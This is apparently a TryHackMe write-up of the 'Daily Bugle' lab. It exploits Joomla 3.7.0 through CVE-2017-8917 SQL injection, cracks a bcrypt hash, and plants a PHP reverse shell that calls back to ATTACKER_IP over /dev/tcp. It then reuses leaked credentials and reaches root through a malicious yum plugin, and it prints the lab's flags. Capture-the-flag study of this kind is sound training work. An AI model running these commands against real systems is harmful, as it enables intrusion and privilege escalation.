# 📰 Daily Bugle — TryHackMe Write-Up
 BY OBADA
> *"Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."*  
> **Difficulty:** Hard | **Platform:** TryHackMe | **Date:** March 2026

---

## 📋 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Joomla SQLi — CVE-2017-8917](#2-joomla-sqli--cve-2017-8917)
3. [Hash Cracking — bcrypt](#3-hash-cracking--bcrypt)
4. [Remote Code Execution via Template Injection](#4-remote-code-execution-via-template-injection)
5. [Lateral Movement — jjameson](#5-lateral-movement--jjameson)
6. [Privilege Escalation — yum Plugin](#6-privilege-escalation--yum-plugin)
7. [Flags](#7-flags)
8. [Summary](#8-summary)

---

## 1. Reconnaissance

```bash
sudo nmap -sCV -O -Pn <TARGET_IP> -oA nmap-result
```

### Results

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 7.4) | For later access |
| 80   | HTTP (Apache 2.4.6) | Joomla CMS |
| 3306 | MySQL | Database (local only) |

### Joomla Fingerprinting

Identified Joomla version from the admin panel footer:

```
Joomla! 3.7.0
```

This version is vulnerable to **CVE-2017-8917** — a SQL injection in the `com_fields` component.

---

## 2. Joomla SQLi — CVE-2017-8917

### What is CVE-2017-8917?

A SQL injection vulnerability in Joomla 3.7.0 affecting the `com_fields` component. It allows unauthenticated attackers to extract data from the database — including admin credentials.

### Exploitation with joomblah.py

Used the `joomblah.py` Python exploit script. The original script was written for Python 2, requiring a fix for Python 3 compatibility:

**Error encountered:**
```
TypeError: can only concatenate str (not "bytes") to str
```

**Fix applied** — changed line 46 from:
```python
result += value
```
to:
```python
result += value.decode('utf-8')
```

**Running the exploit:**
```bash
python3 joomblah.py http://<TARGET_IP>
```

**Result:**
```
Found user: ['811', 'Super User', 'jonah', 'jonah@tryhackme.com',
'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```

---

## 3. Hash Cracking — bcrypt

The hash type `$2y$` is **bcrypt** — one of the strongest password hashing algorithms. It is intentionally slow, making brute-force attacks expensive.

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked password:** `spiderman123`

> **Note:** bcrypt with cost factor 10 (1024 iterations) took ~10 minutes on 4 threads. This is by design — bcrypt is slow to resist brute-force attacks.

---

## 4. Remote Code Execution via Template Injection

### Accessing the Admin Panel

Navigated to `http://<TARGET_IP>/administrator` and logged in with:
- **Username:** `jonah`
- **Password:** `spiderman123`

### Template PHP Injection

In Joomla, admin users can edit template files directly — including PHP files that are served by the web server.

**Path:** Extensions → Templates → Templates → Beez3 → index.php

Replaced the entire `index.php` content with a PHP reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
```

Started a listener:
```bash
nc -lvnp 4444
```

Triggered execution by navigating to the homepage:
```
http://<TARGET_IP>/
```

**Result:** Shell as `apache` ✅

### Credential Discovery

Found database credentials in Joomla's configuration file:

```bash
cat /var/www/html/configuration.php
```

```php
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
```

---

## 5. Lateral Movement — jjameson

Tried the database password for the system user `jjameson` — **password reuse** confirmed!

```bash
ssh jjameson@<TARGET_IP>
# Password: nv5uz9r3ZEDzVjNu
```

**Result:** Shell as `jjameson` ✅

### User Flag

```bash
cat ~/user.txt
# 27a260fe3cba712cfdedb1c86d80442e
```

---

## 6. Privilege Escalation — yum Plugin

### Enumeration

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/yum
```

`jjameson` can run `yum` as root without a password.

**Reference:** [GTFOBins — yum](https://gtfobins.github.io/gtfobins/yum/)

### How the Exploit Works

`yum` supports **plugins** — Python scripts that execute during yum operations. By creating a malicious plugin and pointing yum to it with a custom config, the plugin executes as root.

**Step 1:** Create a temporary working directory:
```bash
TF=$(mktemp -d)
```

**Step 2:** Create a yum config pointing to our plugin directory:
```bash
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
```

**Step 3:** Create the plugin config file:
```bash
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
```

**Step 4:** Create the malicious plugin — spawns `/bin/sh` as root:
```bash
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

**Step 5:** Execute yum with our custom config:
```bash
sudo yum -c $TF/x --enableplugin=y
```

**Result:** Root shell ✅

### Root Flag

```bash
cat /root/root.txt
# eec3d53292b1821868266858d7fa6f79
```

---

## 7. Flags

| Flag | Value |
|------|-------|
| 🔍 Joomla Version | `3.7.0` |
| 🔑 Jonah's Password | `spiderman123` |
| 👤 User Flag | `27a260fe3cba712cfdedb1c86d80442e` |
| 🏆 Root Flag | `eec3d53292b1821868266858d7fa6f79` |

---

## 8. Summary

### Attack Chain

```
Nmap → Joomla 3.7.0 on Port 80
    │
    └─► CVE-2017-8917 (joomblah.py SQLi)
            └─► jonah hash ($2y$ bcrypt)
                    └─► john → spiderman123
                            │
                            └─► Joomla Admin Panel (/administrator)
                                    └─► Template Editor (index.php → PHP reverse shell)
                                            └─► Shell as apache
                                                    │
                                                    └─► configuration.php → nv5uz9r3ZEDzVjNu
                                                            └─► SSH as jjameson → user.txt ✅
                                                                    │
                                                                    └─► sudo yum + malicious plugin
                                                                            └─► ROOT 🏆
```

### Techniques Used

| Technique | Tool/Command | Context |
|-----------|-------------|---------|
| CMS Fingerprinting | Browser / URL | Identifying Joomla 3.7.0 |
| SQL Injection | joomblah.py (CVE-2017-8917) | Extracting admin hash |
| Hash Cracking | John the Ripper | Cracking bcrypt hash |
| Template PHP Injection | Joomla Admin Panel | RCE as apache |
| Password Reuse | SSH | Lateral movement to jjameson |
| sudo yum Plugin Abuse | GTFOBins | PrivEsc to root |

### Lessons Learned

- **Python 2 → Python 3 migration issues** are common with older exploit scripts. Always read the traceback carefully — `TypeError: can only concatenate str (not "bytes") to str` points directly to the fix needed.
- **bcrypt** (`$2y$`) is expensive to crack — always check if simpler attack vectors exist before relying on brute-force.
- **Joomla Template Editor** is a powerful RCE vector for any admin-level user — always check CMS admin panels for file editing capabilities.
- **Configuration files** (`configuration.php`, `wp-config.php`, `.env`) almost always contain credentials — check them immediately after getting a shell.
- **Password reuse** between database and system accounts is extremely common in real-world environments.
- **yum plugin exploitation** is a non-obvious but powerful PrivEsc technique — always check GTFOBins for any binary you can run as root.

---

*Write-up by [XENOS](https://obadahamed.github.io) | Part of the 52-Week Red Team Roadmap*
